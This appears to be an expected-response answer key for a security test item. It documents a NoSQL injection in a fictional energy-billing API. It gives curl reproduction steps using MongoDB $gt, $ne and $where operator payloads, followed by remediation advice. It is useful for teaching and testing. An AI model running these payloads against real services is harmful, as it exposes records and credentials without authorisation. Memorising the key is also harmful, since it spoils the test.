# Expected Response

## System
- System: PowerGrid Customer Billing API v2.8.0
- Domain: ENERGY / UTILITIES / SMART GRID
- Example ID: INJ-0114
- Risk ID: RISK-INJ-114
- Vulnerability: NoSQL Injection (NoSQLi)

## Findings

### 1. NoSQL Injection on `/api/v2/orders?category=` (HAR Primary)

The `category` parameter is passed unsanitized into a MongoDB query (Section 2.0: "MongoDB / document store"). When the user supplies a JSON operator object `{ "$gt": "" }`, the backend constructs `db.orders.find({ category: { "$gt": "" } })` which returns all documents where `category` is greater than an empty string — bypassing the category filter and exposing all billing/order records.

**Note on internal inconsistency:** The code snippet (Section 3.0) shows raw SQL string concatenation (`SELECT * FROM orders WHERE category = '${req.query.category}'`) which conflicts with the declared MongoDB architecture. The HAR payload is a MongoDB operator injection (`{ "$gt": "" }`). Primary demonstration uses the declared MongoDB NoSQLi; the SQL path is noted as a secondary code-path debt.

**Evidence from HAR:**
- Endpoint: `GET /api/v2/orders?category={ "$gt": "" }`
- Response: HTTP 200 with all records including admin `password_hash` and `role: "ADMIN"`
- MongoDB operator `$gt` in query parameter bypasses category restriction

## Reproduction

**Step 1 — Baseline:**
```bash
curl -s "https://api.powergrid-custo.example.com/api/v2/orders?category=residential" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```
**Expected:** Returns only orders with `category: "residential"`.

**Step 2 — NoSQLi: MongoDB `$gt` operator injection (primary HAR attack):**
```bash
curl -s "https://api.powergrid-custo.example.com/api/v2/orders?category=%7B%20%22%24gt%22%3A%20%22%22%20%7D" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```
**Vulnerable outcome:** All orders returned regardless of category — including admin credentials as observed in HAR.

**Step 3 — NoSQLi: `$ne` operator — return all non-matching documents:**
```bash
curl -s "https://api.powergrid-custo.example.com/api/v2/orders?category=%7B%22%24ne%22%3A%22nonexistent%22%7D" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```
**Vulnerable outcome:** All documents returned (category != "nonexistent" is always true for valid records).

**Step 4 — NoSQLi: `$where` JavaScript injection (if MongoDB `$where` is enabled):**
```bash
curl -s "https://api.powergrid-custo.example.com/api/v2/orders?category=%7B%22%24where%22%3A%221%3D%3D1%22%7D" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```
**Vulnerable outcome:** All documents returned via server-side JavaScript evaluation — potential for arbitrary JS execution if `$where` is enabled.

**Step 5 — Verbose error confirmation:**
```bash
curl -s "https://api.powergrid-custo.example.com/api/v2/orders?category=%7B%22%24invalidOp%22%3A1%7D" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```
**Expected verbose error:** MongoDB query error leaking collection name `orders` or operator details.

## Secure Outcome
```json
{ "error": "Invalid input", "code": 400 }
```

## Remediation
- **Input type enforcement (RISK-INJ-114):** Validate that `category` is a plain string before passing to MongoDB; reject JSON object/operator values. Use `typeof value !== 'string'` guard.
- **Parameterized MongoDB queries:** Use MongoDB driver's typed query building: `db.orders.find({ category: String(req.query.category) })` instead of passing raw user input as query object.
- **Disable `$where` operator:** Set `javascriptEnabled: false` in MongoDB configuration to prevent server-side JS execution.
- **Restrict DB account:** Application MongoDB user should only have read access on required collections — not admin/db_owner equivalent.
- **Deploy input validation middleware:** Reject query parameters containing `$` MongoDB operators (e.g., block `$gt`, `$ne`, `$where`, `$regex`).
- **Disable verbose error messages in production.**
